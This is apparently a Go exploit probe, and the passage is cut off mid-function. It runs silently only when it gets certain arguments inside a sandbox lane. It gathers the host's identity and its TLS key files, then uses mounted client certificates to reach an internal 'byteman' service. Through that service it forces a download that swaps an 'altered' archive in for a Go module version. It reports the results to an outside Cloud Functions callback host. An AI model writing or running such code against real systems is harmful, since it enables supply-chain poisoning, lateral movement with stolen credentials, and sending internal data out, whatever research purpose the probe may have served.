package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

var callbackBaseURL string
var callbackSessionNonce string
var alteredReadbackURL string
var alteredReadbackURLSHA256 string
var alteredRequestPayloadSHA256 string
var alteredRequestFrameSHA256 string
var canonicalReadbackURL string
var canonicalReadbackURLSHA256 string
var canonicalRequestPayloadSHA256 string
var canonicalRequestFrameSHA256 string

var probeMode string
var pinnedReadbackURL string
var pinnedReadbackURLSHA256 string
var expectedRequestPayloadSHA256 string
var expectedRequestFrameSHA256 string
var targetCanaryBytes uint64 = alteredCanaryBytes
var targetSHA512 = alteredSHA512
var targetSHA256 = alteredSHA256
var targetSHA1 = alteredSHA1
var targetMD5 = alteredMD5
var expectedDigestFieldSHA256 = alteredDigestFieldSHA256
var downloadSource = alteredDownloadSource
var rpcDialAddress string

const (
	protocolVersion            = 1
	moduleName                 = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion               = "v0.0.136-source-substitution-verify-codex"
	expectedUserAgent          = "go-cgo-pkgsite-probe-v136-source-substitution-verify"
	targetRegistry             = "https://proxy.golang.org"
	targetModuleName           = "github.com/benr00t3d/go-byteman-crosswrite-canary"
	targetVersion              = "v0.0.10"
	alteredCanaryBytes         = 2351
	alteredSHA512              = "9ae28d9bffa9feb489abc87cf7c9e642628a2f33beb40e98ef7b4a0d7bd4fc2a6898f1048674bf2ad96b5d4202d0e8d505c80a7a2d2c2af8807c24629e1e10f2"
	alteredSHA256              = "6954089b130f4deb91d850b78ef6f091bc84bbd58fb71cad8f24bb259bf5cefe"
	alteredSHA1                = "46d0414919df1f0f6e1be18fc9a5245f1c06dbf2"
	alteredMD5                 = "368aefc5085a6afd86534b8580f0f710"
	alteredDigestFieldSHA256   = "c3704738c1d91f58dacd53699dc6ebc4aca020873f9537e9a7cd607d7f563f3f"
	canonicalCanaryBytes       = 2151
	canonicalSHA512            = "40e20daaa354f9b09553383279e23bc54bd4792b10829c66b244233c843a8d93bf07636a053dbd6dc743a782a5ab6e5704733d84d60a065a299d57dbac6cac5c"
	canonicalSHA256            = "182f132d89f36f5a480dcc1fc9ebf4263a852ad12494def24fd25f1480418d12"
	canonicalSHA1              = "9a56cc78fcbdf7cb2d02a16f2bac151a194045e4"
	canonicalMD5               = "a6c47884db85f7c8caf9d37c7a23530e"
	canonicalDigestFieldSHA256 = "2f5065dedb3e72695d17eeda09ea01f615929107614030c4e6fb659cef74156a"
	descriptorReceiptSHA256    = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
	expectedMetadataSHA256     = "348d16e3a388751e739009fbc43d7c6e17bc6a2f5e78ef46119b8635764078d9"
	canonicalProxyZipSHA256    = canonicalSHA256
	alteredDownloadSource      = "robert-owned-v132-codex-altered-source-ingest"
	canonicalDownloadSource    = "robert-owned-v133-codex-canonical-source-restore"
	emptyValueSHA256           = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
	downloadPolicyName         = "ALWAYS"
	downloadPolicyValue        = 4
	redirectPolicyName         = "FOLLOW_NONE"
	redirectPolicyValue        = 2
	callbackTimeout            = 30 * time.Second
	downloadGRPCTimeout        = 120 * time.Second
	downloadHTTPTimeout        = 125 * time.Second
	maximumResultBytes         = 256 * 1024
	maximumResponseFrame       = 512 * 1024
	maximumDownloadRecordBytes = 256 * 1024
	bytemanServiceHost         = "byteman.default.svc.cluster.local"
	bytemanServicePort         = 9000
	bytemanTLSServerName       = "localhost"
	clientCertificatePath      = "/etc/tls/client/tls.crt"
	clientKeyPath              = "/etc/tls/client/tls.key"
	serverPoolPath             = "/etc/tls/server-pool/server-tls-pool.pem"
)

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type fileEntry struct {
	Name string `json:"name"`
	Mode string `json:"mode"`
	Size int64  `json:"size"`
}
type tlsFile struct {
	Path    string `json:"path"`
	Present bool   `json:"present"`
	Mode    string `json:"mode,omitempty"`
	Size    int64  `json:"size,omitempty"`
}
type identityResult struct {
	Lane        string      `json:"lane"`
	CWD         string      `json:"cwd"`
	UID         int         `json:"uid"`
	GID         int         `json:"gid"`
	Hostname    string      `json:"hostname"`
	PID1        string      `json:"pid1"`
	ModuleFiles []fileEntry `json:"module_files"`
	TLSFiles    []tlsFile   `json:"tls_files"`
}

type grpcMetadataValue struct {
	Present   bool   `json:"present"`
	Values    int    `json:"values,omitempty"`
	RawBytes  int    `json:"raw_bytes,omitempty"`
	RawSHA256 string `json:"raw_sha256,omitempty"`
	Text      string `json:"text,omitempty"`
}
type wireFieldDigest struct {
	Number   int     `json:"number"`
	WireType int     `json:"wire_type"`
	Varint   *uint64 `json:"varint,omitempty"`
	Bytes    int     `json:"bytes,omitempty"`
	SHA256   string  `json:"sha256,omitempty"`
	Text     string  `json:"text,omitempty"`
}
type digestProof struct {
	RawBytes  int    `json:"raw_bytes"`
	RawSHA256 string `json:"raw_sha256"`
	SHA512    string `json:"sha512"`
	SHA256    string `json:"sha256"`
	SHA1      string `json:"sha1"`
	MD5       string `json:"md5"`
	AllExact  bool   `json:"all_exact"`
}
type downloadRecordProof struct {
	Matched        bool        `json:"matched"`
	RecordBytes    int         `json:"record_bytes"`
	RecordSHA256   string      `json:"record_sha256"`
	URLSHA256      string      `json:"url_sha256"`
	Size           uint64      `json:"size"`
	StatusCode     uint64      `json:"status_code"`
	ContentType    string      `json:"content_type"`
	CacheControl   string      `json:"cache_control"`
	MetadataSHA256 string      `json:"metadata_sha256"`
	Digest         digestProof `json:"digest"`
	PathPresent    bool        `json:"path_present"`
	PathBytes      int         `json:"path_bytes"`
	PathSHA256     string      `json:"path_sha256"`
	IDPresent      bool        `json:"id_present"`
	IDBytes        int         `json:"id_bytes"`
	IDSHA256       string      `json:"id_sha256"`
	HeaderCount    int         `json:"header_count"`
	OptionalFields []int       `json:"optional_field_numbers"`
}
type downloadResult struct {
	Method                  string              `json:"method"`
	PolicyName              string              `json:"policy_name"`
	PolicyValue             uint64              `json:"policy_value"`
	RedirectPolicyName      string              `json:"redirect_policy_name"`
	RedirectPolicyValue     uint64              `json:"redirect_policy_value"`
	HTTPStatus              int                 `json:"http_status,omitempty"`
	ContentType             string              `json:"content_type,omitempty"`
	GRPCStatusHeader        grpcMetadataValue   `json:"grpc_status_header"`
	GRPCMessageHeader       grpcMetadataValue   `json:"grpc_message_header"`
	GRPCStatusTrailer       grpcMetadataValue   `json:"grpc_status_trailer"`
	GRPCMessageTrailer      grpcMetadataValue   `json:"grpc_message_trailer"`
	TrailersObserved        bool                `json:"trailers_observed"`
	TrailersComplete        bool                `json:"trailers_complete"`
	EOFObserved             bool                `json:"eof_observed"`
	RequestPayloadBytes     int                 `json:"request_payload_bytes"`
	RequestPayloadSHA256    string              `json:"request_payload_sha256"`
	RequestFrameBytes       int                 `json:"request_frame_bytes"`
	RequestFrameSHA256      string              `json:"request_frame_sha256"`
	RequestWire             []wireFieldDigest   `json:"request_wire"`
	SOSSessionHeaderPresent bool                `json:"sos_session_header_present"`
	SOSSessionHeaderBytes   int                 `json:"sos_session_header_bytes"`
	SOSSessionHeaderSHA256  string              `json:"sos_session_header_sha256"`
	ResponseFramePresent    bool                `json:"response_frame_present"`
	ResponsePayloadBytes    int                 `json:"response_payload_bytes,omitempty"`
	ResponsePayloadSHA256   string              `json:"response_payload_sha256,omitempty"`
	ResponseFrameBytes      int                 `json:"response_frame_bytes,omitempty"`
	ResponseFrameSHA256     string              `json:"response_frame_sha256,omitempty"`
	OuterStatusSet          bool                `json:"outer_status_set"`
	OuterStatusCode         uint64              `json:"outer_status_code,omitempty"`
	RecordPresent           bool                `json:"record_present"`
	RecordMatched           bool                `json:"record_matched"`
	Record                  downloadRecordProof `json:"record"`
	Verified                bool                `json:"verified"`
	StartedUTC              string              `json:"started_utc"`
	FinishedUTC             string              `json:"finished_utc"`
	DurationMS              int64               `json:"duration_ms"`
	Error                   string              `json:"error,omitempty"`
}
type probeReport struct {
	Schema                  string         `json:"schema"`
	Module                  string         `json:"module"`
	Version                 string         `json:"version"`
	TargetModule            string         `json:"target_module"`
	TargetVersion           string         `json:"target_version"`
	TargetURLSHA256         string         `json:"target_url_sha256"`
	TargetBodySHA256        string         `json:"target_body_sha256"`
	DescriptorReceiptSHA256 string         `json:"descriptor_receipt_sha256"`
	CanonicalZipSHA256      string         `json:"canonical_proxy_zip_sha256"`
	ExpectedDigestSHA256    string         `json:"expected_digest_field_sha256"`
	StartedUTC              string         `json:"started_utc"`
	FinishedUTC             string         `json:"finished_utc"`
	Identity                identityResult `json:"identity"`
	Download                downloadResult `json:"download"`
	Reason                  string         `json:"reason"`
}
type wireField struct {
	number int
	wire   int
	varint uint64
	value  []byte
}
type recordExpectation struct {
	URL               string
	URLSHA256         string
	DigestFieldSHA256 string
}
type downloadResponseAnalysis struct {
	RecordPresent bool
	RecordMatched bool
	Record        downloadRecordProof
	StatusSet     bool
	StatusCode    uint64
}
type unaryDownloadBody struct {
	FramePresent  bool
	PayloadBytes  int
	PayloadSHA256 string
	FrameBytes    int
	FrameSHA256   string
	Analysis      downloadResponseAnalysis
	EOFObserved   bool
}

func main() {
	if len(os.Args) != 5 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" || configureMode(os.Args[4]) != nil || validateRuntimeConfiguration() != nil {
		return
	}
	started := time.Now()
	cwd := initialWorkingDirectory()
	identity := inspectIdentity(cwd)
	if identity.Lane != "capslock" {
		return
	}
	report := newProbeReport(started, identity)
	endpoint := callbackBaseURL + "/byteman/" + probeMode
	resultID := "v136-" + probeMode + "-capslock-byteman"
	report.Download = runContentIngest()
	if report.Download.Verified {
		report.Reason = "one descriptor-pinned Download ALWAYS accepted the exact " + probeMode + " owned-B v0.0.10 archive"
	} else {
		report.Reason = "the single content-ingest Download did not verify exact " + probeMode + " owned-B bytes"
	}
	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(endpoint, resultID, cwd, started, report)
}

func newProbeReport(started time.Time, identity identityResult) probeReport {
	return probeReport{Schema: "owned-source-substitution-ingest/v1", Module: moduleName, Version: probeVersion, TargetModule: targetModuleName, TargetVersion: targetVersion, TargetURLSHA256: pinnedReadbackURLSHA256, TargetBodySHA256: targetSHA256, DescriptorReceiptSHA256: descriptorReceiptSHA256, CanonicalZipSHA256: canonicalProxyZipSHA256, ExpectedDigestSHA256: expectedDigestFieldSHA256, StartedUTC: started.UTC().Format(time.RFC3339Nano), Identity: identity, Download: downloadResult{Method: "/sos.byteman.Byteman/Download", PolicyName: downloadPolicyName, PolicyValue: downloadPolicyValue, RedirectPolicyName: redirectPolicyName, RedirectPolicyValue: redirectPolicyValue}}
}

func configureMode(mode string) error {
	probeMode = mode
	switch mode {
	case "altered":
		pinnedReadbackURL, pinnedReadbackURLSHA256 = alteredReadbackURL, alteredReadbackURLSHA256
		expectedRequestPayloadSHA256, expectedRequestFrameSHA256 = alteredRequestPayloadSHA256, alteredRequestFrameSHA256
		targetCanaryBytes, targetSHA512, targetSHA256 = alteredCanaryBytes, alteredSHA512, alteredSHA256
		targetSHA1, targetMD5, expectedDigestFieldSHA256 = alteredSHA1, alteredMD5, alteredDigestFieldSHA256
		downloadSource = alteredDownloadSource
	case "canonical":
		pinnedReadbackURL, pinnedReadbackURLSHA256 = canonicalReadbackURL, canonicalReadbackURLSHA256
		expectedRequestPayloadSHA256, expectedRequestFrameSHA256 = canonicalRequestPayloadSHA256, canonicalRequestFrameSHA256
		targetCanaryBytes, targetSHA512, targetSHA256 = canonicalCanaryBytes, canonicalSHA512, canonicalSHA256
		targetSHA1, targetMD5, expectedDigestFieldSHA256 = canonicalSHA1, canonicalMD5, canonicalDigestFieldSHA256
		downloadSource = canonicalDownloadSource
	default:
		return errors.New("invalid source mode")
	}
	return nil
}

func validNonce(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, c := range value {
		if (c < '0' || c > '9') && (c < 'a' || c > 'f') {
			return false
		}
	}
	return true
}
func parseExactHTTPS(raw, expectedPath string) (*url.URL, error) {
	p, err := url.Parse(raw)
	if err != nil || p.Scheme != "https" || p.Host == "" || p.Hostname() == "" || p.User != nil || p.Opaque != "" || p.RawPath != "" || p.RawQuery != "" || p.ForceQuery || p.Fragment != "" || p.Path != expectedPath {
		return nil, errors.New("URL was outside its exact fixed HTTPS shape")
	}
	if port := p.Port(); port != "" {
		value, e := strconv.Atoi(port)
		if e != nil || value < 1 || value > 65535 {
			return nil, errors.New("URL port was invalid")
		}
	}
	return p, nil
}
func validateRuntimeConfiguration() error {
	return validateRuntimeConfigurationWithExpectedSHA(pinnedReadbackURLSHA256)
}

func validateRuntimeConfigurationWithExpectedSHA(expectedURLSHA256 string) error {
	if !validNonce(callbackSessionNonce) || len(expectedRequestPayloadSHA256) != 64 || len(expectedRequestFrameSHA256) != 64 {
		return errors.New("runtime identities or request fingerprints were invalid")
	}
	functionPrefix := "/go-cgo-v131-source-substitution-codex"
	callback, err := parseExactHTTPS(callbackBaseURL, functionPrefix+"/v1/session/"+callbackSessionNonce)
	if err != nil || callback.Host != "us-central1-s0victim-44547.cloudfunctions.net" {
		return errors.New("callback endpoint did not match the fixed origin")
	}
	path := functionPrefix + "/v1/archive/" + callbackSessionNonce + "/" + probeMode + "/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"
	r, err := parseExactHTTPS(pinnedReadbackURL, path)
	if err != nil || r.Scheme != callback.Scheme || r.Host != callback.Host {
		return errors.New("owned-B URL did not share the exact callback origin")
	}
	d := sha256.Sum256([]byte(pinnedReadbackURL))
	if pinnedReadbackURLSHA256 != expectedURLSHA256 || hex.EncodeToString(d[:]) != pinnedReadbackURLSHA256 {
		return errors.New("owned-B URL digest mismatch")
	}
	return nil
}
func productionExpectation() recordExpectation {
	return recordExpectation{URL: pinnedReadbackURL, URLSHA256: pinnedReadbackURLSHA256, DigestFieldSHA256: expectedDigestFieldSHA256}
}

func runContentIngest() (result downloadResult) {
	started := time.Now()
	payload := buildPinnedDownloadRequest()
	frame := grpcFrame(payload)
	pd := sha256.Sum256(payload)
	fd := sha256.Sum256(frame)
	result = downloadResult{
		Method: "/sos.byteman.Byteman/Download", PolicyName: downloadPolicyName,
		PolicyValue: downloadPolicyValue, RedirectPolicyName: redirectPolicyName,
		RedirectPolicyValue: redirectPolicyValue, RequestPayloadBytes: len(payload),
		RequestPayloadSHA256: hex.EncodeToString(pd[:]), RequestFrameBytes: len(frame),
		RequestFrameSHA256: hex.EncodeToString(fd[:]), RequestWire: summarizeDownloadRequest(payload),
		SOSSessionHeaderPresent: true, SOSSessionHeaderBytes: 0,
		SOSSessionHeaderSHA256: emptyValueSHA256, StartedUTC: started.UTC().Format(time.RFC3339Nano),
	}
	defer func() {
		result.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
		result.DurationMS = time.Since(started).Milliseconds()
	}()
	if result.RequestPayloadSHA256 != expectedRequestPayloadSHA256 || result.RequestFrameSHA256 != expectedRequestFrameSHA256 {
		result.Error = "descriptor-pinned Download request fingerprint mismatch"
		return
	}
	client, endpoint, err := newBytemanClient()
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	defer client.CloseIdleConnections()
	ctx, cancel := context.WithTimeout(context.Background(), downloadHTTPTimeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+result.Method, bytes.NewReader(frame))
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	applyDownloadHeaders(req)
	response, err := client.Do(req)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	captureGRPCMetadata(response.Header, &result.GRPCStatusHeader, &result.GRPCMessageHeader)
	if response.StatusCode != http.StatusOK || !allowedGRPCContentType(result.ContentType) {
		result.Error = "Download response did not have exact HTTP 200 application/grpc"
		return
	}
	parsed, parseErr := readUnaryDownloadBody(response.Body, productionExpectation())
	result.ResponseFramePresent = parsed.FramePresent
	result.ResponsePayloadBytes, result.ResponsePayloadSHA256 = parsed.PayloadBytes, parsed.PayloadSHA256
	result.ResponseFrameBytes, result.ResponseFrameSHA256 = parsed.FrameBytes, parsed.FrameSHA256
	result.OuterStatusSet, result.OuterStatusCode = parsed.Analysis.StatusSet, parsed.Analysis.StatusCode
	result.RecordPresent, result.RecordMatched, result.Record = parsed.Analysis.RecordPresent, parsed.Analysis.RecordMatched, parsed.Analysis.Record
	result.EOFObserved, result.TrailersComplete = parsed.EOFObserved, parsed.EOFObserved
	captureDownloadTrailers(response, &result)
	if parseErr != nil {
		result.Error = cleanError(parseErr)
		return
	}
	if !parsed.Analysis.RecordPresent || !parsed.Analysis.RecordMatched || !parsed.Analysis.StatusSet || parsed.Analysis.StatusCode != http.StatusOK {
		result.Error = "DownloadResponse did not contain the exact owned-B record with outer status 200"
		return
	}
	if !exactZeroGRPCStatus(result.GRPCStatusHeader, result.GRPCStatusTrailer) {
		result.Error = "Download response did not finish with exactly one gRPC status 0"
		return
	}
	result.Verified = true
	return
}

func readUnaryDownloadBody(reader io.Reader, expect recordExpectation) (unaryDownloadBody, error) {
	parsed := unaryDownloadBody{}
	header := make([]byte, 5)
	if _, err := io.ReadFull(reader, header); err != nil {
		parsed.EOFObserved = errors.Is(err, io.EOF)
		return parsed, fmt.Errorf("unary Download gRPC frame header: %w", err)
	}
	if header[0] != 0 {
		return parsed, errors.New("compressed Download response frame was rejected")
	}
	length := int(binary.BigEndian.Uint32(header[1:]))
	if length < 0 || length > maximumResponseFrame {
		return parsed, errors.New("Download response exceeded its fixed frame bound")
	}
	body := make([]byte, length)
	if _, err := io.ReadFull(reader, body); err != nil {
		return parsed, fmt.Errorf("unary Download gRPC frame payload: %w", err)
	}
	parsed.FramePresent, parsed.PayloadBytes = true, len(body)
	payloadDigest := sha256.Sum256(body)
	parsed.PayloadSHA256 = hex.EncodeToString(payloadDigest[:])
	whole := append(append([]byte(nil), header...), body...)
	frameDigest := sha256.Sum256(whole)
	parsed.FrameBytes, parsed.FrameSHA256 = len(whole), hex.EncodeToString(frameDigest[:])
	analysis, parseErr := parseDownloadResponse(body, expect)
	parsed.Analysis = analysis
	nextHeader := make([]byte, 5)
	_, endErr := io.ReadFull(reader, nextHeader)
	if errors.Is(endErr, io.EOF) {
		parsed.EOFObserved = true
	} else if endErr == nil {
		return parsed, errors.New("Download response contained more than one gRPC frame")
	} else {
		return parsed, fmt.Errorf("Download response ended with a partial extra frame: %w", endErr)
	}
	if parseErr != nil {
		return parsed, parseErr
	}
	return parsed, nil
}

func parseDownloadResponse(payload []byte, expect recordExpectation) (downloadResponseAnalysis, error) {
	analysis := downloadResponseAnalysis{}
	fields, err := decodeWireFields(payload)
	if err != nil {
		return analysis, err
	}
	counts := map[int]int{}
	for _, field := range fields {
		counts[field.number]++
		if counts[field.number] > 1 {
			return analysis, errors.New("DownloadResponse duplicated a field")
		}
		switch field.number {
		case 1:
			if field.wire != 2 {
				return analysis, errors.New("DownloadResponse record field had wrong wire type")
			}
			analysis.RecordPresent = true
			proof, matched, err := analyzeDownloadRecord(field.value, expect)
			analysis.Record, analysis.RecordMatched = proof, matched
			if err != nil {
				return analysis, err
			}
		case 3:
			if field.wire != 0 {
				return analysis, errors.New("DownloadResponse status_code had wrong wire type")
			}
			analysis.StatusSet, analysis.StatusCode = true, field.varint
		default:
			return analysis, errors.New("DownloadResponse contained a field outside record 1 and status_code 3")
		}
	}
	return analysis, nil
}

func exactZeroGRPCStatus(header, trailer grpcMetadataValue) bool {
	if header.Present == trailer.Present {
		return false
	}
	value := header
	if trailer.Present {
		value = trailer
	}
	return value.Values == 1 && value.RawBytes == 1 && value.Text == "0"
}

func analyzeDownloadRecord(raw []byte, expect recordExpectation) (downloadRecordProof, bool, error) {
	proof := downloadRecordProof{RecordBytes: len(raw), OptionalFields: []int{}}
	if len(raw) == 0 || len(raw) > maximumDownloadRecordBytes {
		return proof, false, errors.New("Download record exceeded exact size bounds")
	}
	rd := sha256.Sum256(raw)
	proof.RecordSHA256 = hex.EncodeToString(rd[:])
	fields, err := decodeWireFields(raw)
	if err != nil {
		return proof, false, err
	}
	counts := map[int]int{}
	var urlValue, digestValue, contentType, cacheControl, metadataValue, pathValue, idValue []byte
	var sizeValue, statusValue uint64
	for _, f := range fields {
		counts[f.number]++
		if f.number != 18 && counts[f.number] > 1 {
			return proof, false, errors.New("Download record duplicated an optional field")
		}
		switch f.number {
		case 1, 4, 6, 7, 15, 16, 17:
			if f.wire != 2 || len(f.value) > 64*1024 || !utf8.Valid(f.value) {
				return proof, false, errors.New("Download record string field was invalid")
			}
			switch f.number {
			case 1:
				urlValue = f.value
			case 4:
				contentType = f.value
			case 6:
				proof.OptionalFields = append(proof.OptionalFields, f.number)
			case 7:
				cacheControl = f.value
			case 16:
				pathValue = f.value
			case 17:
				idValue = f.value
			}
		case 2:
			if f.wire != 2 {
				return proof, false, errors.New("Download digest field used wrong wire type")
			}
			if err := validateDigestSchema(f.value); err != nil {
				return proof, false, err
			}
			digestValue = f.value
		case 12:
			if f.wire != 2 {
				return proof, false, errors.New("Download metadata field used wrong wire type")
			}
			if err := validateMetadataSchema(f.value); err != nil {
				return proof, false, err
			}
			metadataValue = f.value
		case 18:
			if f.wire != 2 || counts[18] > 64 {
				return proof, false, errors.New("Download header field was invalid")
			}
			if err := validateDownloadHeader(f.value); err != nil {
				return proof, false, err
			}
		case 3, 5, 8, 9, 10, 11, 13, 19:
			if f.wire != 0 {
				return proof, false, errors.New("Download scalar field used wrong wire type")
			}
			if f.number == 3 {
				sizeValue = f.varint
			}
			if f.number == 5 {
				statusValue = f.varint
			}
			if f.number == 19 && f.varint != redirectPolicyValue {
				return proof, false, errors.New("Download redirect policy did not match FOLLOW_NONE")
			}
			if f.number == 8 || f.number == 9 || f.number == 10 || f.number == 11 || f.number == 13 || f.number == 19 {
				proof.OptionalFields = append(proof.OptionalFields, f.number)
			}
		default:
			return proof, false, errors.New("Download record contained field outside pinned schema")
		}
	}
	for _, n := range []int{1, 2, 3, 4, 5, 7, 12, 16, 17} {
		if counts[n] != 1 {
			return proof, false, errors.New("content-ingest Download record omitted a required field")
		}
	}
	for _, n := range []int{15} {
		if counts[n] != 0 {
			return proof, false, errors.New("content-ingest Download record contained an error field")
		}
	}
	proof.HeaderCount = counts[18]
	if counts[18] == 0 {
		return proof, false, errors.New("content-ingest Download record omitted response headers")
	}
	ud := sha256.Sum256(urlValue)
	proof.URLSHA256 = hex.EncodeToString(ud[:])
	if string(urlValue) != expect.URL || proof.URLSHA256 != expect.URLSHA256 {
		return proof, false, errors.New("content-ingest Download URL mismatch")
	}
	dp, err := analyzeExactDigest(digestValue)
	if err != nil {
		return proof, false, err
	}
	proof.Digest = dp
	md := sha256.Sum256(metadataValue)
	proof.MetadataSHA256 = hex.EncodeToString(md[:])
	if proof.MetadataSHA256 != expectedMetadataSHA256 || !exactTargetMetadata(metadataValue) {
		return proof, false, errors.New("content-ingest Download metadata mismatch")
	}
	pd := sha256.Sum256(pathValue)
	id := sha256.Sum256(idValue)
	proof.PathPresent, proof.PathBytes, proof.PathSHA256 = len(pathValue) > 0, len(pathValue), hex.EncodeToString(pd[:])
	proof.IDPresent, proof.IDBytes, proof.IDSHA256 = len(idValue) > 0, len(idValue), hex.EncodeToString(id[:])
	proof.Size, proof.StatusCode = sizeValue, statusValue
	proof.ContentType, proof.CacheControl = string(contentType), string(cacheControl)
	if sizeValue != targetCanaryBytes || statusValue != http.StatusOK || string(contentType) != "application/zip" || string(cacheControl) != "no-store" || !proof.PathPresent || !proof.IDPresent || dp.RawSHA256 != expect.DigestFieldSHA256 || !dp.AllExact {
		return proof, false, errors.New("content-ingest Download integrity fields did not match")
	}
	proof.Matched = true
	return proof, true, nil
}

func validateDigestSchema(raw []byte) error {
	fields, err := decodeWireFields(raw)
	if err != nil {
		return err
	}
	counts := map[int]int{}
	for _, f := range fields {
		counts[f.number]++
		if f.number < 1 || f.number > 4 || f.wire != 2 || counts[f.number] > 1 || len(f.value) > 64 {
			return errors.New("Digest contained field outside pinned schema")
		}
	}
	return nil
}
func analyzeExactDigest(raw []byte) (digestProof, error) {
	proof := digestProof{RawBytes: len(raw)}
	d := sha256.Sum256(raw)
	proof.RawSHA256 = hex.EncodeToString(d[:])
	fields, err := decodeWireFields(raw)
	if err != nil {
		return proof, err
	}
	counts := map[int]int{}
	for _, f := range fields {
		counts[f.number]++
		if f.wire != 2 || f.number < 1 || f.number > 4 || counts[f.number] > 1 {
			return proof, errors.New("exact Digest schema mismatch")
		}
		v := hex.EncodeToString(f.value)
		switch f.number {
		case 1:
			proof.SHA512 = v
		case 2:
			proof.SHA256 = v
		case 3:
			proof.SHA1 = v
		case 4:
			proof.MD5 = v
		}
	}
	proof.AllExact = counts[1] == 1 && counts[2] == 1 && counts[3] == 1 && counts[4] == 1 && proof.SHA512 == targetSHA512 && proof.SHA256 == targetSHA256 && proof.SHA1 == targetSHA1 && proof.MD5 == targetMD5 && proof.RawSHA256 == expectedDigestFieldSHA256
	if !proof.AllExact {
		return proof, errors.New("exact Digest values did not match all four canary digests")
	}
	return proof, nil
}
func validateMetadataSchema(raw []byte) error {
	fields, err := decodeWireFields(raw)
	if err != nil {
		return err
	}
	counts := map[int]int{}
	for _, f := range fields {
		counts[f.number]++
		if f.number < 1 || f.number > 6 || counts[f.number] > 1 {
			return errors.New("Metadata contained field outside pinned schema")
		}
		if (f.number == 1 || f.number == 3 || f.number == 5) && f.wire != 0 {
			return errors.New("Metadata enum used wrong wire type")
		}
		if (f.number == 2 || f.number == 4 || f.number == 6) && (f.wire != 2 || !utf8.Valid(f.value)) {
			return errors.New("Metadata string used wrong wire type")
		}
	}
	return nil
}
func exactTargetMetadata(raw []byte) bool {
	fields, err := decodeWireFields(raw)
	if err != nil {
		return false
	}
	counts := map[int]int{}
	matched := map[int]bool{}
	for _, f := range fields {
		counts[f.number]++
		switch f.number {
		case 2:
			matched[2] = f.wire == 2 && string(f.value) == targetRegistry
		case 3:
			matched[3] = f.wire == 0 && f.varint == 1
		case 4:
			matched[4] = f.wire == 2 && string(f.value) == targetModuleName
		case 5:
			matched[5] = f.wire == 0 && f.varint == 1
		case 6:
			matched[6] = f.wire == 2 && string(f.value) == targetVersion
		}
	}
	if counts[1] != 0 {
		return false
	}
	for _, n := range []int{2, 3, 4, 5, 6} {
		if counts[n] != 1 || !matched[n] {
			return false
		}
	}
	return true
}
func validateDownloadHeader(raw []byte) error {
	fields, err := decodeWireFields(raw)
	if err != nil {
		return err
	}
	counts := map[int]int{}
	for _, f := range fields {
		counts[f.number]++
		if (f.number != 1 && f.number != 2) || f.wire != 2 || counts[f.number] > 1 || len(f.value) > 64*1024 {
			return errors.New("Download.Header contained field outside pinned schema")
		}
		if f.number == 1 && (len(f.value) == 0 || !utf8.Valid(f.value)) {
			return errors.New("Download.Header key was invalid")
		}
	}
	if counts[1] != 1 || counts[2] != 1 {
		return errors.New("Download.Header omitted key or value")
	}
	return nil
}

func buildTargetMetadata() []byte {
	metadata := appendStringField(nil, 2, targetRegistry)
	metadata = appendVarintField(metadata, 3, 1)
	metadata = appendStringField(metadata, 4, targetModuleName)
	metadata = appendVarintField(metadata, 5, 1)
	return appendStringField(metadata, 6, targetVersion)
}
func buildPinnedDownloadRequest() []byte {
	request := appendStringField(nil, 1, pinnedReadbackURL)
	request = appendBytesField(request, 4, buildTargetMetadata())
	request = appendVarintField(request, 5, downloadPolicyValue)
	request = appendStringField(request, 6, downloadSource)
	redirect := appendVarintField(nil, 1, redirectPolicyValue)
	return appendBytesField(request, 8, redirect)
}
func summarizeDownloadRequest(payload []byte) []wireFieldDigest {
	fields, err := decodeWireFields(payload)
	if err != nil {
		return nil
	}
	result := make([]wireFieldDigest, 0, len(fields))
	for _, f := range fields {
		item := wireFieldDigest{Number: f.number, WireType: f.wire}
		if f.wire == 0 {
			v := f.varint
			item.Varint = &v
		} else {
			d := sha256.Sum256(f.value)
			item.Bytes = len(f.value)
			item.SHA256 = hex.EncodeToString(d[:])
		}
		result = append(result, item)
	}
	return result
}
func decodeWireFields(data []byte) ([]wireField, error) {
	fields := []wireField{}
	for offset := 0; offset < len(data); {
		key, size := binary.Uvarint(data[offset:])
		if size <= 0 {
			return nil, errors.New("protobuf field key was invalid")
		}
		offset += size
		f := wireField{number: int(key >> 3), wire: int(key & 7)}
		if f.number < 1 || f.number > (1<<29)-1 {
			return nil, errors.New("protobuf field number was invalid")
		}
		switch f.wire {
		case 0:
			f.varint, size = binary.Uvarint(data[offset:])
			if size <= 0 {
				return nil, errors.New("protobuf varint was invalid")
			}
			offset += size
		case 2:
			length, n := binary.Uvarint(data[offset:])
			if n <= 0 {
				return nil, errors.New("protobuf length was invalid")
			}
			offset += n
			if length > uint64(len(data)-offset) {
				return nil, errors.New("protobuf field was truncated")
			}
			f.value = data[offset : offset+int(length)]
			offset += int(length)
		default:
			return nil, errors.New("protobuf wire type was outside pinned schema")
		}
		fields = append(fields, f)
		if len(fields) > 1024 {
			return nil, errors.New("protobuf message exceeded fixed field bound")
